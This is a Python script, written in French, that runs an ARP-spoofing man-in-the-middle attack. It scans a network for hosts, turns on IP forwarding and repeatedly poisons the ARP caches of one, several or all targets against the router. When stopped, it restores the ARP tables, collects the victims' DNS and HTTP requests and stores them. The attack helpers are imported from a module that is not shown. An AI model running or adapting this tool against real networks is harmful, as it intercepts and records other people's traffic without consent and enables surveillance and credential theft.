from function import *
from scapy.all import *
from datetime import date
import time 
import sys
from threading import Thread

def attaque():
	sent_packet=0
	while True :
			
		atck_mitm(target_ip,routerIP, routerMac, targetMac)
		sys.stdout.write("[*] paquets envoyé[%d]\r" %(sent_packet))
		sys.stdout.flush()
		sent_packet+=1
			



today = date.today()
date = today.strftime("%d %B %y")

print("===Bienvenue dans ce programme d'attaque Man In The Middle===\nvous avez plusieurs choix :\n1:Vous souhaitez scanner le reseau afin de trouver des adresses IP disponibles. \n2:Vous connaissez deja l'adresse ip de la cible. ")
user_choice= input("Saisissez votre choix: ")


if user_choice == "1" :

# on scan le réseau la reseau d'adresse ip disponible
	plage_ip=input("\nSaisissez la plage d'adresse ip a scanner: ")

	print("-------------------")
	print("vous avez choisi de scanner cette plage d'adresse IP : {}".format(plage_ip))

	list_IP=scan_ip(plage_ip)
	data_plageIP = []
	data_plageIP.append(plage_ip)
	data_plageIP.append(date)
	

	for ip in list_IP :
		print("voici les adresses IP disponibles : {0}" .format(ip))
		print("--------------")

	print("\nNous allons recuperer les adresses MAC qui correspondent aux  adresses IP trouvées ")
	print("------------------")

	scan_mac=scan_Mac(list_IP)
	data_ip_active= get_Ip_Active(list_IP)

	
	

	



print("===Nous allons recuperer les informations du routeur===")
routerIP = input("Veuillez saisir l'adresse ip du routeur: ")
routerIP_list=[]
routerIP_list.append(routerIP)
MacRouter = scan_Mac(routerIP_list)


routerMac=recup_mac_adress(MacRouter)

 

print("Nous allons passer au spoofing ARP ")
user_choice1=input("1: Vous voulez spoofer 1 seul IP.\n2: Vous voulez spoofer plusieurs IP.\n3: vous souhaiter spoofer toute les adresses IP trouvé.\nSaisissez votre choix: ")

os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")

if user_choice1 == "1":
	try :

		target_ip=input("\nSaisissez l'adresse ip de la victime ")
		print("--------------")
		print("nous allons recuperer l'adresse mac de : {}".format(target_ip))
		target_list=[]
		target_list.append(target_ip)
		scan_mac = scan_Mac(target_list)
	
		targetMac=recup_mac_adress(scan_mac)

		attaque()
	


	except KeyboardInterrupt:

		print("\nNous allons stopper l'attaque Man in the middle")
		stop = reARP(target_ip,routerIP, routerMac, targetMac)
		list_dns_request = recup_dns()
		list_request_http = recup_http()
		insert_data(target_ip,data_plageIP,data_ip_active,list_dns_request,list_request_http)

elif user_choice1 == "2":

	try : 
		list_ip=list_ip()
		scan_mac=scan_Mac(list_ip)

		targetMac=recup_mac_adress(scan_mac)
		sent_packet=0

		
		while True :

			for ip, mac in scan_mac.items():
				
				atck_mitm(ip,routerIP, routerMac, mac)
				sys.stdout.write("[*] paquets envoyé[%d] \r" %(sent_packet))
				sys.stdout.flush()
				sent_packet+=1


		
	except KeyboardInterrupt:

		for ip, mac in scan_mac.items():
			print("\nNous allons stopper l'attaque Man in the middle")
			reARP(ip,routerIP, routerMac, mac)


elif user_choice1 == "3" :

	try:
		sent_packet=0
		while True: 
			for ip, mac in scan_mac.items(): 
				print("ip = {}, mac = {}".format(ip,mac))
				atck_mitm(ip,routerIP, routerMac, mac)
				print("[*] paquets envoyé[%d%]\r" %(sent_packet))
				sent_packet+=1

		
	except KeyboardInterrupt:

		for ip, mac in scan_mac.items(): 	
			print("\nNous allons stopper l'attaque Man in the middle")
			reARP(ip,routerIP, routerMac, mac)


